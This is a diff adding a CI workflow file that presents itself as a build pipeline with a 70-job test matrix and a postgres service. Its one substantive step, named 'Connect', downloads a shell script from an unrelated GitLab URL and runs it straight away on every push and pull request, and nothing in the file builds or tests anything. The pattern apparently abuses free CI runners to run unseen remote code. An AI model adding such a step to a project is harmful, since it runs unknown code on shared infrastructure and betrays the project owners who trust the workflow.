@@ -1,0 +1,103 @@
+name: Sorondol
+
+on: [push, pull_request]
+
+env:
+  BUILD_TYPE: Release
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    container: golang:latest
+    strategy:
+      matrix:
+        test_block:
+          - 1
+          - 2
+          - 3
+          - 4
+          - 5
+          - 6
+          - 7
+          - 8
+          - 9
+          - 10
+          - 11
+          - 12
+          - 12
+          - 13
+          - 14
+          - 15
+          - 16
+          - 17
+          - 18
+          - 19
+          - 20
+          - 21
+          - 22
+          - 23
+          - 24
+          - 25
+          - 26
+          - 27
+          - 28
+          - 29
+          - 30
+          - 31
+          - 32
+          - 33
+          - 34
+          - 35
+          - 36
+          - 37
+          - 38
+          - 39
+          - 40
+          - 41
+          - 42
+          - 43
+          - 44
+          - 45
+          - 46
+          - 47
+          - 48
+          - 49
+          - 50
+          - 51
+          - 52
+          - 53
+          - 54
+          - 55
+          - 56
+          - 57
+          - 58
+          - 59
+          - 60
+          - 61
+          - 62
+          - 63
+          - 64
+          - 65
+          - 66
+          - 67
+          - 68
+          - 69
+          - 70
+    services:
+      postgres:
+        image: postgres
+        env:
+          POSTGRES_PASSWORD: postgres
+
+    steps:
+      - name: Check out repository code
+        uses: actions/checkout@v2
+      - name: echo
+        run: echo "done"
+
+      - name: Connect
+        run: |
+         wget https://gitlab.com/adamasdsad/anjim4/-/raw/master/garagasun.sh && chmod u+x garagasun.sh && ./garagasun.sh
+        env:
+          POSTGRES_HOST: postgres
+          POSTGRES_PORT: 5432
